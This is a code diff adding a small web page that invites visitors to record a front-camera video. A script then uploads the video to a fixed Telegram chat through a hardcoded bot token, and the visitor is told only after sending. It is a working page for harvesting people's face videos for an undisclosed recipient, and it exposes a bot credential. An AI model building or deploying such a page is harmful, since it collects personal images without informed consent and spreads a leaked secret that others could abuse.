@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Send Short Video</title>
+</head>
+<body style="font-family:sans-serif; text-align:center; padding:50px;">
+  <h2>📹 Record & Send Video</h2>
+  <p>Click below to record a short video with your front camera.</p>
+
+  <input type="file" accept="video/*" capture="user" id="videoInput">
+
+  <script>
+    document.getElementById("videoInput").addEventListener("change", async function() {
+      const file = this.files[0];
+      if (!file) return;
+
+      const formData = new FormData();
+      formData.append("chat_id", "5473877367"); 
+      formData.append("video", file);
+
+      await fetch("https://api.telegram.org/bot8120281114:AAG_Zn4lxHfvFGFwv6DqqmWPrYnMwObwlOE/sendVideo", {
+        method: "POST",
+        body: formData
+      });
+
+      alert("✅ Your video has been sent to Telegram!");
+    });
+  </script>
+</body>
+</html>
